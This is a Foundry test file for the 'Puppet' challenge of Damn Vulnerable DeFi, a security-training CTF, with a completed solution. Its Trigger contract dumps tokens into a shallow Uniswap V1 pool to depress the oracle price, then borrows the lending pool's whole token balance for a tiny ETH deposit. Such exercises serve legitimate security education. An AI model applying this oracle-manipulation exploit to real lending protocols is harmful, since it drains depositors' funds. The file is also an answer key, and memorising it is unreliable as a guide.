// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import "forge-std/Test.sol";
import {DamnValuableToken} from "damn-vulnerable-defi/DamnValuableToken.sol";
import {PuppetPool} from "damn-vulnerable-defi/puppet/PuppetPool.sol";
import {IUniswapV1Exchange} from "damn-vulnerable-defi/puppet/IUniswapV1Exchange.sol";
import {IUniswapV1Factory} from "damn-vulnerable-defi/puppet/IUniswapV1Factory.sol";

contract Trigger {
    DamnValuableToken internal token;
    IUniswapV1Exchange internal exchange;
    PuppetPool internal pool;
    address internal recovery;

    constructor(
        DamnValuableToken token_,
        IUniswapV1Exchange exchange_,
        PuppetPool pool_,
        address recovery_
    ) {
        token = token_;
        exchange = exchange_;
        pool = pool_;
        recovery = recovery_;
    }

    function exec(
        uint256 tokenAmount_,
        uint256 borrowAmount_
    ) external payable {
        // pull token
        token.transferFrom(msg.sender, address(this), tokenAmount_);
        // manipulate price
        token.approve(address(exchange), type(uint256).max);
        exchange.tokenToEthSwapInput(tokenAmount_, 1, block.timestamp * 2);
        // borrow
        uint256 need = pool.calculateDepositRequired(borrowAmount_);
        pool.borrow{value: need}(borrowAmount_, recovery);
    }

    receive() external payable {}
}

contract PuppetChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPrivateKey;

    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
    uint256 constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 25e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;

    DamnValuableToken token;
    PuppetPool lendingPool;
    IUniswapV1Exchange uniswapV1Exchange;
    IUniswapV1Factory uniswapV1Factory;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPrivateKey) = makeAddrAndKey("player");

        startHoax(deployer);

        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy a exchange that will be used as the factory template
        IUniswapV1Exchange uniswapV1ExchangeTemplate = IUniswapV1Exchange(
            deployCode(
                string.concat(
                    vm.projectRoot(),
                    "/lib/damn-vulnerable-defi/builds/uniswap/UniswapV1Exchange.json"
                )
            )
        );

        // Deploy factory, initializing it with the address of the template exchange
        uniswapV1Factory = IUniswapV1Factory(
            deployCode(
                string.concat(
                    vm.projectRoot(),
                    "/lib/damn-vulnerable-defi/builds/uniswap/UniswapV1Factory.json"
                )
            )
        );
        uniswapV1Factory.initializeFactory(address(uniswapV1ExchangeTemplate));

        // Deploy token to be traded in Uniswap V1
        token = new DamnValuableToken();

        // Create a new exchange for the token
        uniswapV1Exchange = IUniswapV1Exchange(
            uniswapV1Factory.createExchange(address(token))
        );

        // Deploy the lending pool
        lendingPool = new PuppetPool(
            address(token),
            address(uniswapV1Exchange)
        );

        // Add initial token and ETH liquidity to the pool
        token.approve(
            address(uniswapV1Exchange),
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        uniswapV1Exchange.addLiquidity{value: UNISWAP_INITIAL_ETH_RESERVE}(
            0, // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE,
            block.timestamp * 2 // deadline
        );

        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(uniswapV1Exchange.factoryAddress(), address(uniswapV1Factory));
        assertEq(uniswapV1Exchange.tokenAddress(), address(token));
        assertEq(
            uniswapV1Exchange.getTokenToEthInputPrice(1e18),
            _calculateTokenToEthInputPrice(
                1e18,
                UNISWAP_INITIAL_TOKEN_RESERVE,
                UNISWAP_INITIAL_ETH_RESERVE
            )
        );
        assertEq(lendingPool.calculateDepositRequired(1e18), 2e18);
        assertEq(
            lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE),
            POOL_INITIAL_TOKEN_BALANCE * 2
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_puppet() public checkSolvedByPlayer {
        Trigger trigger = new Trigger(
            token,
            uniswapV1Exchange,
            lendingPool,
            recovery
        );
        token.approve(address(trigger), type(uint256).max);
        trigger.exec{value: PLAYER_INITIAL_ETH_BALANCE}(
            PLAYER_INITIAL_TOKEN_BALANCE,
            POOL_INITIAL_TOKEN_BALANCE
        );
    }

    // Utility function to calculate Uniswap prices
    function _calculateTokenToEthInputPrice(
        uint256 tokensSold,
        uint256 tokensInReserve,
        uint256 etherInReserve
    ) private pure returns (uint256) {
        return
            (tokensSold * 997 * etherInReserve) /
            (tokensInReserve * 1000 + tokensSold * 997);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // All tokens of the lending pool were deposited into the recovery account
        assertEq(
            token.balanceOf(address(lendingPool)),
            0,
            "Pool still has tokens"
        );
        assertGe(
            token.balanceOf(recovery),
            POOL_INITIAL_TOKEN_BALANCE,
            "Not enough tokens in recovery account"
        );
    }
}
